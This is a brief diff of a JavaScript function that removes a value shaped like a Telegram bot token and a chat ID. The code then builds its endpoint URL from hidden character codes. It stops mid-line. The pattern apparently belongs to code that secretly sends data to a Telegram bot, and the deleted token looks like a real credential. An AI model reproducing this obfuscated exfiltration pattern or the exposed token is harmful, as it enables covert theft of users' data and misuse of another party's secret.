@@ -1,7 +1,6 @@
 (function(){
     
-    var p1 = '8416791643:AAEZInsemXwV2akMlgI0OY27YNG-uqB9r_o';  
-    var p2 = '7390531894';    
+    
     
     // Build endpoint dynamically
     var base = String.fromCharCode(104,116,116,112,115,58,47,47)+
